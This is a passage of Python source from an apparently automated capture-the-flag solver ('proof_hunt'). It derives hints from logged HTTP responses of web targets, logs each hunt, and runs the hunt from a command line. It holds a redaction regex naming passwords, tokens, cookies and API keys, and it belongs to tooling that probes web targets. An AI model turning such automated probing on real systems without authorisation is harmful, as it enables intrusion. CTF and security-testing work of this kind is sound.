    # stale attempt can never donate a value.  WebOpen separately requires an
    # explicit no-deadline current attempt and sends it through the one-id
    # labels.candidates path.
    sink = ctx.get("candidate_sink")
    if isinstance(sink, dict):
        for t in valid:
            aid = t["answer_id"]
            row = _baseline_candidate(hunters.get(aid))
            if row is not None:
                sink[aid] = row
    # B-237: the same bounded per-target class summaries the log row records (``post_classes``), handed to
    # an in-process caller (the web lane) so it can name why a class did not read without a log_dir.
    class_sink = ctx.get("class_sink")
    if isinstance(class_sink, dict):
        for t in valid:
            h = hunters.get(t["answer_id"])
            if h is not None:
                class_sink[t["answer_id"]] = {
                    "classes": {k: dict(v) for k, v in (getattr(h, "peer_meta", {}) or {}).items()
                                if isinstance(v, dict)},
                    "class_hint": getattr(h, "class_hint", None),
                    "stopped": getattr(h, "stopped", None), "where": getattr(h, "where", None)}
    _write_log(ctx.get("log_dir"), ctx.get("challenge"), valid, hunters, out)
    return out


# ---------------------------------------------------------------------------------------------------------
#  Backlog row 558: a no-proof class hint for the handoff, from responses the hunt already holds
# ---------------------------------------------------------------------------------------------------------
# Day 27: two bases ended Layer 1 `0 of 1` with nothing in the handoff about why, although the hunt's own
# responses named the class (426 websocket_upgrade_required, 405 post_required, 403 credit_not_overspent /
# loopback_only, clue keys stream_reference and deployment).  This reads the request log ONLY: it sends
# nothing, answers nothing, and a wrong hint costs an agent a turn, never a submit.
CLASS_HINT_BASE_KEYS = frozenset({"framework", "current_role"})   # on every clue feed: no class signal
CLASS_HINT_MAX_ROUTES = 4
CLASS_HINT_MAX_KEYS = 6
_HINT_KEY = re.compile(r"[A-Za-z0-9_.-]{1,48}")
_HINT_WORD = re.compile(r"[A-Za-z0-9_.:-]{1,64}")
_HINT_SECRET_KEY = re.compile(
    r"(?i)(?:^|[_.-])(?:pass(?:word|wd)?|pwd|secret|token|cookie|session|auth(?:orization)?|"
    r"api[_.-]?key|client[_.-]?secret|user(?:name)?|key)(?:$|[_.-])")


def _baseline_candidate(hunter):
    """One clue-route baseline proof eligible for an *unsure* probe.

    This is intentionally narrower than the row-607 prose: the baseline read
    must be complete, exactly one proof may exist, and its sole recorded
    provenance must be the bare clue-named route tagged by the Hunter as a
    clue read.  The corresponding transport row must be a target-local GET
    200 with no refused cross-origin redirect.  Any ambiguity returns None.
    """
    try:
        if (hunter is None or getattr(hunter, "stopped", None) != "baseline proof decoy only"
                or bool(getattr(hunter, "baseline_incomplete", False))):
            return None
        plain = set(getattr(hunter, "plain", set()) or set())
        if len(plain) != 1:
            return None
        value, = plain
        if not (isinstance(value, str) and PROOF_FORMAT.fullmatch(value)):
            return None
        origins = list((getattr(hunter, "seen", {}) or {}).get(value) or [])
        if len(origins) != 1 or not isinstance(origins[0], (list, tuple)) or len(origins[0]) != 2:
            return None
        path, shape = origins[0]
        if shape != "clue" or not isinstance(path, str):
            return None
        client = getattr(hunter, "client", None)
        entries = list(getattr(client, "log", None) or [])
        hint = getattr(hunter, "class_hint", None) or class_hint(entries)
        routes = list(hint.get("routes") or []) if isinstance(hint, dict) else []
        matched = [r for r in routes if isinstance(r, dict) and r.get("path") == path
                   and r.get("method") == "GET" and r.get("status") == 200]
        if len(matched) != 1:
            return None
        transport = []
        for entry in entries:
            if not isinstance(entry, dict):
                continue
            p, query = _hint_entry_path(entry)
            if (p == path and not query and str(entry.get("method") or "GET").upper() == "GET"
                    and str(entry.get("status")) == "200"):
                transport.append(entry)
        if len(transport) != 1:
            return None
        entry = transport[0]
        if entry.get("redirect_not_followed"):
            return None
        base = getattr(client, "origin", None)
        requested = entry.get("url")
        final = entry.get("final_url") or requested
        if (_web.safe_same_origin_route(requested, base, allow_query=False) is None
                or _web.safe_same_origin_route(final, base, allow_query=False) is None):
            return None
        return {"value": value, "path": path, "source": "clue-route-baseline"}
    except Exception:
        return None


def _hint_entry_path(entry):
    try:
        parts = urllib.parse.urlsplit(str(entry.get("url") or ""))
    except ValueError:
        return None, None
    return parts.path or "/", parts.query


def _hint_body(entry):
    body = entry.get("body")
    if isinstance(body, str):            # a saved request log (save_log base64-encodes bodies)
        try:
            body = base64.b64decode(body, validate=True)
        except Exception:
            body = body.encode("utf-8", "replace")
    return bytes(body) if isinstance(body, (bytes, bytearray)) else b""


def _hint_json(entry):
    raw = _hint_body(entry)[:64_000]
    try:
        doc = json.loads(raw.decode("utf-8"))
    except Exception:
        return None
    return doc if isinstance(doc, dict) else None


def class_hint(entries):
    """One evidence dict from a hunt's request log (live ``WebClient.log`` or a saved proof_hunt-*.json), or None.

    ``{"line": str, "routes": [{key, path, method, status, error}], "clue_keys": [{key, value}]}``: for every
    route the clue feed names, the FIRST answer to a bare request of it (no query) with its status and its
    JSON ``error`` word; and the clue keys beyond the routes and the generic framework/current_role.  It
    reads only the log it is given (no request) and never raises.
    """
    try:
        rows = [e for e in list(entries or []) if isinstance(e, dict)]
        clues = None
        for e in rows:
            path, query = _hint_entry_path(e)
            if (path == "/api/clues" and not query and str(e.get("method") or "GET").upper() == "GET"
                    and str(e.get("status")) == "200"):
                clues = _hint_json(e)
                if clues is not None:
                    break
        if not clues:
            return None
        routes, keys = [], []
        for key, value in list(clues.items())[:64]:
            k = str(key)
            if not _HINT_KEY.fullmatch(k):
                continue
            if (isinstance(value, str) and value.startswith("/") and not value.startswith("//")
                    and _web.safe_route_path(value, max_bytes=1024)):
                if len(routes) >= CLASS_HINT_MAX_ROUTES:
                    continue
                route = value.split("?", 1)[0]
                first = None
                for e in rows:
                    p, q = _hint_entry_path(e)
                    if p == route and not q:
                        first = e
                        break
                row = {"key": k, "path": _web.safe_display_text(route, 120)}
                if first is not None:
                    doc = _hint_json(first) or {}
                    word = doc.get("error") if isinstance(doc.get("error"), str) else None
                    try:
                        status = int(first.get("status"))
                    except (TypeError, ValueError):
                        status = None
                    row.update(method=str(first.get("method") or "GET").upper()[:8], status=status,
                               error=word if word and _HINT_WORD.fullmatch(word) else None)
                routes.append(row)
            elif k not in CLASS_HINT_BASE_KEYS and len(keys) < CLASS_HINT_MAX_KEYS:
                shown = ("<redacted>" if _HINT_SECRET_KEY.search(k) else
                         value if isinstance(value, (str, int, float, bool)) or value is None
                         else type(value).__name__)
                keys.append({"key": k, "value": _web.safe_display_text(str(shown), 40)})
        if not routes and not keys:
            return None
        parts = []
        for r in routes:
            if "method" in r:
                parts.append("%s %s %s %s%s" % (r["key"], r["path"], r["method"], r["status"],
                                                 (" " + r["error"]) if r.get("error") else ""))
            else:
                parts.append("%s %s not requested" % (r["key"], r["path"]))
        if keys:
            parts.append("other clue keys: " + ", ".join("%s=%s" % (x["key"], x["value"]) for x in keys))
        return {"line": _web.safe_display_text("; ".join(parts), 400), "routes": routes, "clue_keys": keys}
    except Exception:
        return None


def _write_log(log_dir, challenge, targets, hunters, out):
    """One row per target in <log_dir>/proof_hunt.jsonl (paths only, no host) and the request log."""
    if not log_dir:
        return
    try:
        d = Path(log_dir)
        d.mkdir(parents=True, exist_ok=True)
        with (d / "proof_hunt.jsonl").open("a", encoding="utf-8") as f:
            for t in targets:
                aid = t["answer_id"]
                h = hunters.get(aid)
                row = {"at": datetime.datetime.now().astimezone().isoformat(timespec="seconds"),
                       "challenge": challenge, "answer_id": aid, "index": t.get("index"), "proof": out.get(aid),
                       "uuid4": bool(out.get(aid) and PROOF_FORMAT.fullmatch(out[aid])),
                       "decoded": bool(getattr(h, "decoded", None)),
                       "shape": getattr(h, "shape", None), "requests": getattr(h, "requests", None),
                       "seconds": round(time.time() - getattr(h, "t0", time.time()), 3),
                       "stopped": getattr(h, "stopped", None), "where": getattr(h, "where", None),
                       "seen": {p: v[:4] for p, v in (getattr(h, "seen", {}) or {}).items()},
                       "plain_proofs": sorted(getattr(h, "plain", set()) or []),
                       "baseline_incomplete": bool(getattr(h, "baseline_incomplete", False)),
                       "candidates": list(getattr(h, "candidates", []) or [])[:12],
                       "forge": getattr(h, "forge_meta", None),
                       "post_classes": dict(getattr(h, "peer_meta", {}) or {}),
                       "endpoint_inventory": getattr(h, "endpoint_inventory", None),
                       "findings": list(getattr(h, "findings", []) or [])[:12],
                       "recon_findings": list(getattr(h, "recon_findings", []) or [])[:24],
                       "refused": list(getattr(h, "refused", []) or [])[:20],
                       "class_hint": getattr(h, "class_hint", None)}
                f.write(json.dumps(row) + "\n")
                if h is not None and h.client is not None:
                    try:
                        redact = getattr(h.client, "redact_log", None)
                        if callable(redact):
                            redact()
                        h.client.save_log(str(d / f"proof_hunt-{re.sub(r'[^A-Za-z0-9._-]', '_', aid)}.json"))
                    except Exception:
                        pass
    except Exception:
        pass


# ---------------------------------------------------------------------------------------------------------
#  CLI
# ---------------------------------------------------------------------------------------------------------
def targets_from_start(start):
    """The contract's targets[] from a saved start: a question's `artifact` names its target's `id` ("Target
    2"), else "Target N" in its text; a start with no ids pairs by position. A question no target matches is
    left out."""
    ts = [t for t in (start.get("targets") or []) if isinstance(t, dict) and t.get("url")]
    qs = [q for q in (start.get("questions") or []) if isinstance(q, dict)]
    aids = start.get("answer_ids") or [q.get("id") for q in qs]
    by_id = {str(t.get("id")).strip().lower(): t for t in ts if t.get("id") is not None}
    out, used = [], set()
    for i, q in enumerate(qs):
        aid = aids[i] if i < len(aids) else q.get("id")
        tgt = by_id.get(str(q.get("artifact") or "").strip().lower())
        if tgt is None:
            m = re.search(r"\btarget\s+(\d+)\b", str(q.get("question") or ""), re.I)
            tgt = by_id.get(f"target {m.group(1)}") if m else None
        if tgt is None and not by_id and i < len(ts):
            tgt = ts[i]
        if tgt is None or not aid or id(tgt) in used:
            continue
        used.add(id(tgt))
        out.append({"answer_id": aid, "url": tgt["url"], "index": i + 1, "question": q.get("question", "")})
    return out


def _challenges_root():
    return ctf_paths.workdir()


def _find_start(challenge):
    root = _challenges_root()
    m = re.search(r"-day-(\d+)", challenge)
    cands = [root / f"day-{int(m.group(1)):02d}" / challenge / "start.json"] if m else []
    cands += sorted(root.glob(f"day-*/{challenge}/start.json"))
    return next((c for c in cands if c.is_file()), None)


def main(argv=None):
    argv = list(sys.argv[1:] if argv is None else argv)
    if not argv or argv[0] in ("-h", "--help"):
        print(__doc__)
        return 0 if argv else 1
    challenge, rest = argv[0], argv[1:]
    seconds, max_requests, given = CLI_SECONDS, CLI_MAX_REQUESTS, []
    i = 0
    try:
        while i < len(rest):
            a = rest[i]
            key, eq, val = a.partition("=")
            if key in ("--seconds", "--max-requests", "--target") and not eq:
                i += 1
                val = rest[i]
            if key == "--seconds":
                seconds = float(val)
            elif key == "--max-requests":
                max_requests = int(val)
            elif key == "--target":
                aid, _, url = val.partition("=")
                if not aid or not url:
                    raise ValueError(a)
                given.append({"answer_id": aid, "url": url, "index": len(given) + 1, "question": ""})
            else:
                raise ValueError(a)
            i += 1
    except (ValueError, IndexError) as e:
        print(f"usage: proof_hunt.py <challenge id> [--seconds N] [--max-requests N] [--target ID=URL] ({e})",
              file=sys.stderr)
        return 1
    start_path = _find_start(challenge)
    targets = given
    if not targets:
        if start_path is None:
            print(json.dumps({"error": "no start.json found", "challenge": challenge}))
            return 1
        try:
            targets = targets_from_start(json.loads(start_path.read_text()))
        except Exception as e:
            print(json.dumps({"error": f"unreadable start.json: {type(e).__name__}"}))
            return 1
        if not targets:
            print(json.dumps({"error": "no targets in start.json yet (a start says 'preparing' first); pass "
                                       "--target ID=URL from op=status", "challenge": challenge}))
            return 1
    log_dir = (start_path.parent / "proof_hunt") if start_path else None
    out = solve_targets(targets, {"deadline": time.time() + seconds, "max_requests": max_requests,
                                  "log_dir": str(log_dir) if log_dir else None, "challenge": challenge})
    print(json.dumps(out, indent=1))
    return 0 if any(out.values()) else 2


if __name__ == "__main__":
    sys.exit(main())
